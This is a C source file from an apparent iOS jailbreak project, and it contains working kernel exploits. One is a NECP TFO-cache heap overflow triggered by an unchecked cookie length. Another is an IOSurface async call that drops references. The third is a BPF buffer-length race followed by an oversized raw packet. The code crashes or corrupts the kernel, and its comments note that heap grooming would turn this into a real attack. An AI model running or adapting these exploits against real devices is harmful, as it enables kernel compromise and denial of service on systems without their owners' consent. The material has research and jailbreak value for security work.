//
//  sploit.c
//  jailbreak112
//
//  Created by Sem Voigtländer on 5/6/18.
//  Copyright © 2018 Jailed Inc. All rights reserved.
//

#include "sploit.h"
#include "offsets.h"
#include "bazadleak.h"
#include <arpa/inet.h>
#include <errno.h>
#include <net/bpf.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/sysctl.h>
#include <sys/types.h>
#include <sys/ucontext.h>
#include <sys/uio.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <semaphore.h>
#include <gethostuuid.h>
#include <sys/fcntl.h>
#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>


/***** mach_vm.h *****/
kern_return_t mach_vm_read(
                           vm_map_t target_task,
                           mach_vm_address_t address,
                           mach_vm_size_t size,
                           vm_offset_t *data,
                           mach_msg_type_number_t *dataCnt);

kern_return_t mach_vm_write(
                            vm_map_t target_task,
                            mach_vm_address_t address,
                            vm_offset_t data,
                            mach_msg_type_number_t dataCnt);

kern_return_t mach_vm_read_overwrite(
                                     vm_map_t target_task,
                                     mach_vm_address_t address,
                                     mach_vm_size_t size,
                                     mach_vm_address_t data,
                                     mach_vm_size_t *outsize);

kern_return_t mach_vm_allocate(
                               vm_map_t target,
                               mach_vm_address_t *address,
                               mach_vm_size_t size,
                               int flags);

kern_return_t mach_vm_deallocate (
                                  vm_map_t target,
                                  mach_vm_address_t address,
                                  mach_vm_size_t size);

kern_return_t mach_vm_protect (
                               vm_map_t target_task,
                               mach_vm_address_t address,
                               mach_vm_size_t size,
                               boolean_t set_maximum,
                               vm_prot_t new_protection);


io_master_t master = 0;

io_connect_t connect_to_service(char* name) {
    kern_return_t err = KERN_FAILURE;
    io_service_t service = 0;
    io_connect_t conn = 0;
    io_iterator_t it;
    int cnt = 0;
    
    //Initialize service
    IOMasterPort(bootstrap_port, &master);
    IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching(name), &it);
    
    
    while (err != KERN_SUCCESS && cnt < 10000) {
        service = IOIteratorNext(it);
        char regName[0x1000];
        memset(&regName, 0, sizeof(regName));
        IORegistryEntryGetName(service, (char*)&regName);
        
        if(IO_OBJECT_NULL != service) {
            err = IOServiceOpen(service, mach_task_self(), 0, &conn);
            if(conn != 0) {
                printf("Found service: %s\n", regName);
            } else {
                printf("%s is not accessible from within userland: %s\n", regName, mach_error_string(err));
            }
        }
        cnt++;
    }
    if(!conn)
        IOServiceOpen(IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(name)), mach_task_self(), 0, &conn);
    return conn;
}

mach_port_t find_H264_AVEDriver() {
    return connect_to_service("IOSurfaceRoot");
}

uint32_t rk32_via_tfp0(mach_port_t tfp0, uint64_t kaddr) {
    kern_return_t err;
    uint32_t val = 0;
    mach_vm_size_t outsize = 0;
    err = mach_vm_read_overwrite(tfp0,
                                 (mach_vm_address_t)kaddr,
                                 (mach_vm_size_t)sizeof(uint32_t),
                                 (mach_vm_address_t)&val,
                                 &outsize);
    if (err != KERN_SUCCESS){
        printf("tfp0 read failed %s addr: 0x%llx err:%x port:%x\n", mach_error_string(err), kaddr, err, tfp0);
        sleep(3);
        return 0;
    }
    
    if (outsize != sizeof(uint32_t)){
        printf("tfp0 read was short (expected %lx, got %llx\n", sizeof(uint32_t), outsize);
        sleep(3);
        return 0;
    }
    return val;
}

#define NECP_OPEN_FLAG_OBSERVER      0x01 // Observers can query clients they don't own
#define NECP_OPEN_FLAG_BACKGROUND    0x02 // Mark this fd as backgrounded
#define NECP_OPEN_FLAG_PUSH_OBSERVER 0x04 // When used with the OBSERVER flag, allows updates to be pushed. Adding clients is not allowed in this mode.

#define NECP_CLIENT_ACTION_ADD              1 // Register a new client. Input: parameters in buffer; Output: client_id
#define NECP_CLIENT_ACTION_REMOVE           2 // Unregister a client. Input: client_id, optional struct ifnet_stats_per_flow
#define NECP_CLIENT_ACTION_COPY_PARAMETERS        3 // Copy client parameters. Input: client_id; Output: parameters in buffer
#define NECP_CLIENT_ACTION_COPY_RESULT          4 // Copy client result. Input: client_id; Output: result in buffer
#define NECP_CLIENT_ACTION_COPY_LIST          5 // Copy all client IDs. Output: struct necp_client_list in buffer
#define NECP_CLIENT_ACTION_REQUEST_NEXUS_INSTANCE   6 // Request a nexus instance from a nexus provider, optional struct necp_stats_bufreq
#define NECP_CLIENT_ACTION_AGENT            7 // Interact with agent. Input: client_id, agent parameters
#define NECP_CLIENT_ACTION_COPY_AGENT         8 // Copy agent content. Input: agent UUID; Output: struct netagent
#define NECP_CLIENT_ACTION_COPY_INTERFACE       9 // Copy interface details. Input: ifindex cast to UUID; Output: struct necp_interface_details
#define NECP_CLIENT_ACTION_SET_STATISTICS       10 // Deprecated
#define NECP_CLIENT_ACTION_COPY_ROUTE_STATISTICS    11 // Get route statistics. Input: client_id; Output: struct necp_stat_counts
#define NECP_CLIENT_ACTION_AGENT_USE          12 // Return the use count and increment the use count. Input/Output: struct necp_agent_use_parameters
#define NECP_CLIENT_ACTION_MAP_SYSCTLS          13 // Get the read-only sysctls memory location. Output: mach_vm_address_t
#define NECP_CLIENT_ACTION_UPDATE_CACHE         14 // Update heuristics and cache
#define NECP_CLIENT_ACTION_COPY_CLIENT_UPDATE     15 // Fetch an updated client for push-mode observer. Output: Client id, struct necp_client_observer_update in buffer
#define NECP_CLIENT_ACTION_COPY_UPDATED_RESULT      16 // Copy client result only if changed. Input: client_id; Output: result in buffer

#define NECP_CLIENT_CACHE_TYPE_ECN                 1       // Identifies use of necp_tcp_ecn_cache
#define NECP_CLIENT_CACHE_TYPE_TFO                 2       // Identifies use of necp_tcp_tfo_cache

#define NECP_CLIENT_CACHE_TYPE_ECN_VER_1           1       // Currently supported version for ECN
#define NECP_CLIENT_CACHE_TYPE_TFO_VER_1           1       // Currently supported version for TFO

#define NECP_MAX_CLIENT_PARAMETERS_SIZE         1024
#define NECP_TFO_COOKIE_LEN_MAX      16

typedef uint64_t           mach_vm_address_t;
typedef struct necp_cache_buffer {
    u_int8_t                necp_cache_buf_type;    //  NECP_CLIENT_CACHE_TYPE_*
    u_int8_t                necp_cache_buf_ver;     //  NECP_CLIENT_CACHE_TYPE_*_VER
    u_int32_t               necp_cache_buf_size;
    mach_vm_address_t       necp_cache_buf_addr;
} necp_cache_buffer;

typedef struct necp_tcp_tfo_cache {
    u_int8_t                necp_tcp_tfo_cookie[NECP_TFO_COOKIE_LEN_MAX];
    u_int8_t                necp_tcp_tfo_cookie_len;
    u_int8_t                necp_tcp_tfo_heuristics_success:1; // TFO succeeded with data in the SYN
    u_int8_t                necp_tcp_tfo_heuristics_loss:1; // TFO SYN-loss with data
    u_int8_t                necp_tcp_tfo_heuristics_middlebox:1; // TFO middlebox detected
    u_int8_t                necp_tcp_tfo_heuristics_success_req:1; // TFO succeeded with the TFO-option in the SYN
    u_int8_t                necp_tcp_tfo_heuristics_loss_req:1; // TFO SYN-loss with the TFO-option
    u_int8_t                necp_tcp_tfo_heuristics_rst_data:1; // Recevied RST upon SYN with data in the SYN
    u_int8_t                necp_tcp_tfo_heuristics_rst_req:1; // Received RST upon SYN with the TFO-option
} necp_tcp_tfo_cache;

//Taken from bsd/sys/socket.h
#define      SO_NECP_CLIENTUUID      0x1111  /* NECP Client uuid */

////////////////////////////////////////////////////////////////////////////////////////////////////
// Helper functions ////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////

int necp_open(int flags)
{
    return syscall(501, flags);
}

int necp_client_action(int necp_fd, uint32_t action, uuid_t client_id, size_t client_id_len, uint8_t *buffer, size_t buffer_size)
{
    return syscall(502, necp_fd, action, client_id, client_id_len, buffer, buffer_size);
}

void print_uuid(char * caption, uuid_t * uuid)
{
    unsigned char * uuid_char = (unsigned char *)uuid;
    printf("%s: %02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x\n", caption,
           uuid_char[0], uuid_char[1], uuid_char[2], uuid_char[3], uuid_char[4], uuid_char[5], uuid_char[6], uuid_char[7],
           uuid_char[8], uuid_char[9], uuid_char[10], uuid_char[11], uuid_char[12], uuid_char[13], uuid_char[14], uuid_char[15]);
}

int port_num = 3333;
int create_connected_socket(int * socks)
{
    printf("Creating a new socket...\n");
    int server_sock, client_sock;
    int bind_count = 0;
    int opt = 1;
    struct sockaddr_in addr;
    
    //Create the socket pair
    
    server_sock = socket(PF_INET, SOCK_STREAM, 0);
    if(server_sock < 0) {
        printf("Couldn't create server socket: errno %d: %s\n", errno, strerror(errno));
        return 1;
    }
    
    printf("Got server socket: %d\n", server_sock);
    
    client_sock = socket(PF_INET, SOCK_STREAM, 0);
    if(client_sock < 0) {
        printf("Couldn't create client socket: errno %d: %s\n", errno, strerror(errno));
        return 1;
    }
    
    printf("Got client socket: %d\n", client_sock);
    
    //Bind the server to a port
    
    opt = 1;
    setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    while(1)
    {
        printf("Binding socket to port %d...\n", port_num);
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr("127.0.0.1");
        addr.sin_port = htons(port_num);
        port_num++;
        
        if(bind(server_sock, (struct sockaddr *)&addr, sizeof(addr)) >= 0)
            break;
        bind_count++;
        if(bind_count == 10) {
            printf("Couldn't bind to the socket: errno %d: %s\n", errno, strerror(errno));
            return 1;
        }
    }
    if(listen(server_sock, 5) < 0) {
        printf("Couldn't listen on the socket: errno %d: %s\n", errno, strerror(errno));
        return 1;
    }
    
    //Connect to the server from the client
    printf("Connecting to the server from the client...\n");
    if(connect(client_sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        printf("Couldn't connect the socket: errno %d: %s\n", errno, strerror(errno));
        return 1;
    }
    
    socks[0] = server_sock;
    socks[1] = client_sock;
    return 0;
}

int heapoverflow()
{
    printf("Trying to overflow the kernel heap...\n");
    int i, ret, necp_fd, socks[2];
    uuid_t client_id;
    uint8_t * buffer;
    size_t buffer_size;
    necp_cache_buffer ncb;
    necp_tcp_tfo_cache nttc;
    
    printf("Trying to get file descriptor...\n");
    //Use necp_open to get a necp file descriptor
    necp_fd = necp_open(0);
    if(necp_fd < 0)
    {
        printf("Couldn't get a necp fd: errno %d: %s\n", errno, strerror(errno));
        return 1;
    }
    
    printf("Got file descriptor: %d\n", necp_fd);
    
    printf("Setting up necp client...\n");
    //Setup a necp client and get the uuid
    memset(client_id, 0, sizeof(client_id));
    buffer = malloc(0x10);
    memset(buffer, 0, 0x10);
    buffer_size = 0x10;
    
    printf("Retrieving the uuid from the client...\n");
    ret = necp_client_action(necp_fd, NECP_CLIENT_ACTION_ADD, client_id, sizeof(client_id), buffer, buffer_size);
    if(ret < 0) {
        printf("Couldn't add a necp client: errno %d: %s\n", errno, strerror(errno));
        return 1;
    }
    print_uuid("client uuid:", &client_id);
    
    //Create a socket and add a flow to the client
    if(create_connected_socket(socks))
        return 1;
    
    printf("Assigning the socket to the necp client...\n");
    if(setsockopt(socks[1], SOL_SOCKET, SO_NECP_CLIENTUUID, &client_id, sizeof(client_id)) < 0) {
        printf("Couldn't assign the socket to the necp client: errno %d: %s\n", errno, strerror(errno));
        return 1;
    }
    
    //Trigger the overflow
    
    //It's not necessary to run this in a loop to trigger the kernel heap overflow.  It's done here
    //to increase the chance that something vital is overflow in the kernel, causing the entire system to
    //crash and show off the overflow.  In a real attack, heap grooming would be preformed to ensure there
    //was something worth overflowing after the victim heap allocation.
    
    printf("Doing the actual overflow...\n");
    for(i = 0; i < 10000000; i++) {
        memset(&nttc, 0x41, sizeof(necp_tcp_tfo_cache));
        nttc.necp_tcp_tfo_cookie_len = 0xff; //bad length - this length is used without validation in a memcpy
        
        memset(&ncb, 0, sizeof(necp_cache_buffer));
        ncb.necp_cache_buf_type = NECP_CLIENT_CACHE_TYPE_TFO;
        ncb.necp_cache_buf_ver = NECP_CLIENT_CACHE_TYPE_TFO_VER_1;
        ncb.necp_cache_buf_size = sizeof(necp_tcp_tfo_cache);
        ncb.necp_cache_buf_addr = (mach_vm_address_t)&nttc;
        
        ret = necp_client_action(necp_fd, NECP_CLIENT_ACTION_UPDATE_CACHE, client_id, sizeof(client_id), (uint8_t *)&ncb, sizeof(necp_cache_buffer));
        if(ret != 0)
            printf("necp_client_action(UPDATE_CACHE): ret=%d (errno %d: %s)\n", ret, errno, strerror(errno));
    }
    return 0;
}


mach_port_t kernelsploit_necp() {
    
    printf("Trying to exploit the kernel using necp overflow...\n");
    printf("Trying to find IOSurface by iteration...\n");
    io_connect_t user_client = find_H264_AVEDriver();
    
    printf("Demonstrating that async_awake's IOSurface vulnerability may not been patched properly yet...\n");
    uint64_t inputScalar[16];
    uint64_t inputScalarCnt = 0;
    
    char inputStruct[4096];
    size_t inputStructCnt = 0x18;
    
    
    uint64_t* ivals = (uint64_t*)inputStruct;
    ivals[0] = 1;
    ivals[1] = 2;
    ivals[2] = 3;
    
    uint64_t outputScalar[16];
    uint32_t outputScalarCnt = 0;
    
    char outputStruct[4096];
    size_t outputStructCnt = 0;
    
    //Allocate a wake port first
    mach_port_t port = MACH_PORT_NULL;
    kern_return_t err = KERN_SUCCESS;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (err != KERN_SUCCESS) {
        printf("failed to allocate new port\n");
    }
    printf("got wake port 0x%x\n", port);
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    
    //And there we go, lets drop some references.
    uint64_t reference[8] = {}; //This is just to speed up the panic time
    uint32_t referenceCnt = 1;
    
    for (int i = 0; i < 10; i++) {
        err = IOConnectCallAsyncMethod(
                                       user_client,
                                       17,
                                       port,
                                       reference,
                                       referenceCnt,
                                       inputScalar,
                                       (uint32_t)inputScalarCnt,
                                       inputStruct,
                                       inputStructCnt,
                                       outputScalar,
                                       &outputScalarCnt,
                                       outputStruct,
                                       &outputStructCnt);
        
        printf("Call %d: %s\n",i , mach_error_string(err));
    
    };
    
    heapoverflow(); //Hasta la vista babe! (Comment this out to prevent panics)
    return user_client;
}

static int rip_sock;
static int bpf;
static bool init_rip_sock(void)
{
    uint32_t maxdgram = 0;
    size_t len = sizeof(maxdgram);
    uint32_t maxdgramnew = (1024*900);
    size_t lennew = sizeof(maxdgram);
    
    // Set the max dgram buf to 900k
    if (sysctlbyname("net.inet.raw.maxdgram", &maxdgram, &len, &maxdgramnew, len) < 0) {
        perror("sysctl error");
        return 0;
    }
    
    rip_sock = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
    if (rip_sock == -1) {
        perror("socket");
        return 0;
    }
    return 1;
}

static bool send_rip_packet(const void *packet, size_t packet_len)
{
    struct sockaddr_in6 dest = { 0 };
    dest.sin6_family = AF_INET6;
    memcpy(&dest.sin6_addr.s6_addr, &in6addr_loopback, sizeof(dest.sin6_addr.s6_addr));
    dest.sin6_port = 0;
    if (sendto(rip_sock, packet, packet_len, 0, (struct sockaddr *) &dest, sizeof(dest)) != packet_len) {
        perror("send_rip_packet");
        return 0;
    }
    return 1;
}

static int lock_thread = 1;


static int complete = 0;
static bool init_bpf()
{
    bpf = open("/dev/bpf3", O_RDWR);
    
    if(bpf == -1) {
        perror("open bpf");
        return 0;
    }
    
    int one = 1;
    
    if(ioctl(bpf, BIOCIMMEDIATE, &one) == -1 ) {
        perror("ioctl BIOCIMMEDIATE");
        return 0;
    }
    return 1;
}

static bool alloc_bpf_buffer(const char *interface)
{
    int hlen = 64;
    // set buffer length to 64
    if (ioctl(bpf, BIOCSBLEN, &hlen) == -1) {
        perror("ioctl BIOCSBLEN");
        return 0;
    }
    int blen = 0;
    if (ioctl(bpf, BIOCGBLEN, &blen) < 0) {
        perror("ioctl(BIOCGBLEN)");
    }
    printf("attaching interface with size of %d\n", blen);
    struct ifreq bound_if;
    strcpy(bound_if.ifr_name, interface);
    if(ioctl(bpf, BIOCSETIF, &bound_if) == -1) {
        perror("ioctl BIOCSETIF");
        return 0;
    }
    return 1;
}

void set_bpf_length(void)
{
    int hlen = 4096;
    // set buffer length to 4096. The allocated buffer length is 64.
    ioctl(bpf, BIOCSBLEN, &hlen);
    int blen = 0;
    ioctl(bpf, BIOCGBLEN, &blen);
    if(blen == hlen) {
        fprintf(stderr, "set length: %d and hlen: %d\n", blen, hlen);
        complete = 1;
        pthread_exit(NULL);
    }
}

void *race_detach(void *data)
{
    while(1) {
        set_bpf_length();
    }
}


mach_port_t kernelsploit_bpf() { //Requires root permission
    printf("Trying to exploit the kernel using bpf overlow...\n");
    if(getegid() + geteuid() != 0) {
        printf("We are: %s\n", getlogin());
        printf("Note: We need root permissions to run the exploit, try with kernelsploit_necp or escalate to root, continuing anyway...\n");
    }
    char *interface = "en0";
    
#define NUM_THREADS 100
    pthread_t threads[NUM_THREADS];
    
    if(!init_rip_sock()) {
        return 0;
    }
    
    if(!init_bpf()) {
        return 0;
    }
    
    if(!alloc_bpf_buffer(interface)) {
        return 0;
    }
    
    int t=0;
    for(t=0;t<NUM_THREADS;t++){
        if(pthread_create(&threads[t], NULL, race_detach, NULL)) {
            fprintf(stderr, "Error creating thread\n");
            return 0;
        }
    }
    
    int promiscuous = 1;
    if( ioctl(bpf, BIOCPROMISC, &promiscuous) == -1){
        perror("BIOCPROMISC");
    }
    
    unsigned int dlt = 1;
    while(1) {
        if (ioctl(bpf, BIOCSDLT, &dlt) == 0) {
            printf("%d worked\n", dlt);
        }
        
        if(complete) {
            unsigned int packet_len = 1024*900;
            unsigned char *packet = malloc(packet_len);
            memset(packet, 0xff, packet_len);
            
            printf("sending rip packet\n");
            if(!send_rip_packet(packet, packet_len)) {
                return 0;
                
            }
        }
        // try another link layer option
        dlt++;
    }
    return 1;
}
